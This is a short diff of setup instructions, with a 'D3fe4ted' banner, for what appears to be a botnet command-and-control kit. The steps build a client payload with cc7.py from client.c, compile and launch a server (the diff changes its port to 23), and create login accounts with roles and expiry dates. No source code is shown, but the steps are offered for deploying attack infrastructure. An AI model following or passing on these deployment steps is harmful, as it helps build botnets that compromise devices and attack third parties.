@@ -15,11 +15,11 @@
    |__|                               by D3fe4ted
 
 1. yum install python python-paramiko screen gcc nano perl perl-CPAN
-2. go to client and change (ip) and (port)
+2. go to client and change (ip)
 3. python2 cc7.py client.c (ip)
 4. Save your payload
 5. gcc server.c -o server -pthread
 6. nano login.txt (username password role mm/dd/yy)
-7. screen ./server (port) 1000 (port)
+7. screen ./server 23 1000 (port)
 8. sudo ./server (port) 1000 (port) (If step 7 doesn't work)</pre></code>
    <div>
